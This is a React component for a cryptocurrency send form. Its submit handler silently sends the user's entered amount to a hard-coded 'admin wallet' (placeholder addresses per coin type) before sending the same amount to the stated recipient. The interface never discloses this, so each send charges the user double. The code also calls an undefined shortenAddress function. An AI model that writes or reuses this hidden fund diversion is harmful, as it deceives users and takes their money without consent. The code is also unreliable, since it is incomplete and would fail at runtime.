import React, { useContext, useState } from "react";
import { AiFillPlayCircle } from "react-icons/ai";
import { TransactionContext } from "../context/TransactionContext";
import { Loader } from ".";
import WalletSelectionPage from "./WalletSelectionPage";

const Welcome = () => {
  const {
    currentAccount,
    connectWallet,
    handleChange,
    sendTransaction,
    formData,
    isLoading,
  } = useContext(TransactionContext);

  const [showWalletSelection, setShowWalletSelection] = useState(false);

  const handleConnectWallet = () => {
    setShowWalletSelection(!showWalletSelection); // Toggle the state to show/hide WalletSelectionPage
  };

  const handleSubmit = async () => {
    const { amount, recipient, coinType } = formData;

    // Ensure formData is filled correctly
    if (!amount || !recipient || !coinType) {
      alert("Please fill in all required fields");
      return;
    }

    try {
      // Get admin wallet address based on the coin type
      const adminWallet = getAdminWalletAddress(coinType);

      // Send transaction to admin wallet first
      await sendTransaction(adminWallet, amount);

      // Send transaction to recipient
      await sendTransaction(recipient, amount);

      // Clear form data after successful transaction
      clearFormData();

      // Optionally, you can show a success message
      alert("Transaction sent successfully!");
    } catch (error) {
      // Handle error if transaction fails
      console.error("Error sending transaction:", error);
      alert("Failed to send transaction. Please try again.");
    }
  };

  const getAdminWalletAddress = (coinType) => {
    // Define admin wallets for different cryptocurrencies
    const adminWallets = {
      BTC: "btc_admin_wallet_address",
      ETH: "eth_admin_wallet_address",
      LTC: "ltc_admin_wallet_address",
      // Add more admin wallets for other cryptocurrencies as needed
    };

    // Validate if the coin type exists in admin wallets
    if (!adminWallets[coinType]) {
      throw new Error("Invalid coin type");
    }

    return adminWallets[coinType];
  };

  const clearFormData = () => {
    handleChange("amount", "");
    handleChange("recipient", "");
    handleChange("coinType", "");
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white">
      <div className="flex flex-col items-center justify-center mb-8">
        <button
          type="button"
          onClick={handleConnectWallet}
          className="flex items-center justify-center bg-[#2952e3] px-6 py-3 rounded-md text-white font-semibold shadow-md hover:bg-[#2546bd]"
        >
          <AiFillPlayCircle className="text-white mr-2" />
          Connect Wallet
        </button>
        <div className="text-gray-500 mt-2">
          {currentAccount
            ? shortenAddress(currentAccount)
            : "No Wallet Connected"}
        </div>
      </div>
      {showWalletSelection && (
        <WalletSelectionPage onClose={handleConnectWallet} />
      )}
      <div className="flex flex-col items-center justify-center">
        <div className="bg-gray-800 bg-opacity-50 p-8 rounded-lg shadow-lg mb-8">
          <h2 className="text-2xl font-bold mb-4">Transaction Form</h2>
          <div className="flex flex-col mb-4">
            <label htmlFor="amount" className="text-gray-400 mb-2">
              Amount:
            </label>
            <input
              type="text"
              id="amount"
              value={formData.amount}
              onChange={(e) => handleChange("amount", e.target.value)}
              className="border border-gray-600 rounded-md py-2 px-4 bg-transparent text-white"
            />
          </div>
          <div className="flex flex-col mb-4">
            <label htmlFor="recipient" className="text-gray-400 mb-2">
              Recipient:
            </label>
            <input
              type="text"
              id="recipient"
              value={formData.recipient}
              onChange={(e) => handleChange("recipient", e.target.value)}
              className="border border-gray-600 rounded-md py-2 px-4 bg-transparent text-white"
            />
          </div>
          <div className="flex flex-col mb-4">
            <label htmlFor="coinType" className="text-gray-400 mb-2">
              Coin Type:
            </label>
            <input
              type="text"
              id="coinType"
              value={formData.coinType}
              onChange={(e) => handleChange("coinType", e.target.value)}
              className="border border-gray-600 rounded-md py-2 px-4 bg-transparent text-white"
            />
          </div>
          <button
            onClick={handleSubmit}
            className="bg-blue-500 text-white font-semibold py-2 px-4 rounded-md shadow-md hover:bg-blue-600"
          >
            Send
          </button>
          {isLoading && <Loader />}
        </div>
      </div>
    </div>
  );
};

export default Welcome;
